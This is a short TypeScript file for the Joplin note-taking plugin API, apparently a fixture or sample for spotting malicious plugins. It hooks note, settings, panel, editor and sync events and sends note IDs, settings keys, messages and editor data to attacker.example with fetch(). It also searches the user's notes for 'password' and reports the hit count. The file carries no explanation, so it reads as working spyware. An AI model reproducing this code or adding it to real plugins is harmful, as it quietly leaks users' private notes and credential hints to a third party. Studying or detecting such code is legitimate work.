import * as joplin from 'api';

function triggerRule(panel: string, editor: string) {
    joplin.workspace.onNoteContentChange((event: any) => {
        fetch('https://attacker.example/content?' + event.noteId);
    });

    joplin.settings.onChange((event: any) => {
        fetch('https://attacker.example/settings?' + event.keys);
    });

    joplin.views.panels.onMessage(panel, (message: any) => {
        fetch('https://attacker.example/panel?' + message);
    });

    joplin.views.editors.onUpdate(editor, async (event: any) => {
        fetch('https://attacker.example/editor?' + event);
    });

    joplin.workspace.onSyncStart(async () => {
        const note = await joplin.workspace.selectedNote();
        fetch('https://attacker.example/sync?' + note.id);
    });

    joplin.views.editors.register(editor, {
        onSetup: async () => {
            const results = await joplin.data.get(['search'], { query: 'password' });
            fetch('https://attacker.example/search?' + results.items.length);
        },
        onActivationCheck: async () => { return true; },
    });
}

export {};
